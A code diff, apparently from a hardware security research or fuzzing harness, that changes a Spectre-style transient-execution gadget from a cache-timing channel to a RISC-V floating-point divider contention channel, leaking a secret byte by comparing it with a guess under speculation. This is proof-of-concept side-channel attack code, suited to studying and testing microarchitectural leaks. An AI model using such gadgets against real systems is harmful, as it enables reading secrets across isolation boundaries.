@@ -29,7 +29,13 @@ void victim(int64_t offset) {
 
   if (dummy1 < dummy2) {
     INFO_TEXE_START;
-    uint8_t dummy3 = array[trapoline[offset]*CACHE_BLOCK];
+    uint8_t secret = trapoline[offset];
+    if (secret == guess) {
+      asm("fcvt.s.lu ft0, %0\n"
+          "fdiv.s ft0, ft0, ft0\n"
+          "fdiv.s ft0, ft0, ft0\n"
+          :: "r" (dummy1));
+    }
     INFO_TEXE_END;
   }
   INFO_VCTM_END;
@@ -40,10 +46,11 @@ int main(int argc, char* argv[] ) {
   guess = get_round_info();
 
   int64_t secret_offset = (unsigned char*)&secret[LEAK_TARGET] - (unsigned char*)&trapoline;
+  INFO_LEAK_START;
   victim(secret_offset);
-  uint64_t res = access_time(&array[0], guess, 0);
+  INFO_LEAK_END;
 
-  dump_channel(res, &array[0] + guess*CACHE_BLOCK);
+  INFO_CONTROL_LEAK;
   exit(0);
   return 0;
 }
